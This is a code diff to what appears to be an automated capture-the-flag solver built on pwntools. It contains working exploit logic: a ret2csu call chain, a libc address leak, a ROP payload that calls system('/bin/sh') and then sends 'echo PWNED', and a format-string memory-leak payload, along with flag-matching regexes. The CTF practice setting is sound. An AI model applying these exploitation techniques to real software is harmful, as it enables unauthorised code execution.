@@ -291,7 +291,6 @@ def _handle(request: dict) -> dict:
                 return {"ok": True, "data": {"solved": False,
                                              "error": "symbols_missing"}}
             g1, g2, mapping = csu["g1"], csu["g2"], csu["mapping"]
-            bss = elf.bss() + 0x100
 
             def csu_call(pointer, rdi, rsi, rdx, after):
                 return (p64(g1) + p64(0) + p64(1) + p64(pointer)
@@ -365,7 +364,6 @@ def _handle(request: dict) -> dict:
                 io = None
                 try:
                     io, leak = open_and_leak(leak_offset)
-                    debug_log.append(("stage", stage2_offset, hex(leak)))
                     if not leak:
                         continue
                     base = leak - libc.symbols["puts"]
@@ -377,7 +375,6 @@ def _handle(request: dict) -> dict:
                     stage2 = (b"A" * stage2_offset + p64(ret_gadget)
                               + p64(pop_rdi) + p64(binsh) + p64(system))
                     # 题目按字节读满 200 次，必须正好喂满 200 字节才会返回
-                    debug_log.append(("pre_send", io.poll()))
                     io.send(stage2.ljust(200, b"B"))
                     time.sleep(0.3)
                     io.send(b"echo PWNED; exit\n")
@@ -409,7 +406,8 @@ def _handle(request: dict) -> dict:
             parts = [f"%{index}$lx".encode() for index in range(1, count + 1)]
             payload = b".".join(parts) + b"."
             started = time.perf_counter()
-            io = process(path)
+            import os as _os
+            io = process(path, cwd=_os.path.dirname(path))
             io.send(payload + b"\n")
             data = io.recvall(timeout=3) or b""
             io.close()
@@ -424,6 +422,12 @@ def _handle(request: dict) -> dict:
             match = re.search(marker + rb"[^}]*\}", blob)
             if match is None:
                 match = re.search(rb"[A-Za-z0-9_]{2,20}\{[^}]{1,80}\}", blob)
+            if match is None and marker in blob:
+                start = blob.index(marker)
+                end = start
+                while end < len(blob) and 32 <= blob[end] < 127:
+                    end += 1
+                match = re.match(rb".*", blob[start:end])
             return {"ok": True, "data": {
                 "solved": match is not None,
                 "leak": match.group(0).decode("ascii", "replace") if match else None,
